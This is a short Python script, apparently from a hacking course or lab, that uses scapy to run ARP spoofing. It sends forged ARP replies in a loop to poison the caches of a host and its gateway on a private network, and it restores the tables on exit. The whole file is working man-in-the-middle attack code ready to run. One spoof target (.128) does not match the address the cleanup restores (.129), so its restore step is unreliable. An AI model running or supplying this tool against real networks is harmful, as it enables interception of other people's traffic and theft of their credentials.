#!/usr/bin/env python
import scapy.all as scapy
import time

def get_mac(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    mac_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    mac_arp_request = mac_broadcast/arp_request
    answered_packet = scapy.srp(mac_arp_request, timeout=1, verbose=False)[0]
    return(answered_packet[0][1].hwsrc)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
    #print(packet.show())
    scapy.send(packet, verbose=False)

def reset(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


sent_packet_count = 0
try:
    while True:
        spoof("192.168.126.129", "192.168.126.2")
        spoof("192.168.126.2", "192.168.126.128")
        sent_packet_count = sent_packet_count + 2
        print("\rPacket sent : " + str(sent_packet_count), end="")
        #sys.stdout.flush() //only used on python 2 or below
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] CTRL + C detected,,,,Resetting ARP table!!!")
    reset("192.168.126.129", "192.168.126.2")
    reset("192.168.126.2", "192.168.126.129")
    time.sleep(1)
    print("Process finished, Quitting!!!")
